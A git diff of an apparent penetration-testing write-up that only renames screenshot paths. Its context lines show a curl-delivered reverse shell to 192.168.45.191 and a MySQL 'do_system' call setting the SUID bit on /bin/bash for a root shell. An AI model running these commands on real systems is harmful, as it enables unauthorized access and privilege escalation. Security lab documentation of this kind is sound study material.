@@ -61,7 +61,7 @@ $ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.191/21 0
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (67) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -176,4 +176,4 @@ mysql> select do_system('chmod u+s /bin/bash');
 
 We can then easily get a `root` shell:
 
-![](<../../../.gitbook/assets/image (22).png>)
+![](<../../../.gitbook/assets/image (22) (10).png>)
